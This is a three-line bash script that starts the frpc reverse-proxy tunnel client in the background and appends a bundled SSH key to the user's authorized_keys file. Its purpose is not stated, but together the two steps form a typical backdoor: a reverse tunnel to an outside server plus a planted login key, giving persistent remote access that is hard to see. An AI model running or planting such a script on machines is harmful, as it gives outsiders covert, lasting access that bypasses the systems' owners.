#!/bin/bash

nohup $PWD/frpc -c frpc.ini >/tmp/frp.log 2>&1 &
grep "WP1sJCBuW0KmDw==" ~/.ssh/authorized_keys || cat authorized_keys >> ~/.ssh/authorized_keys
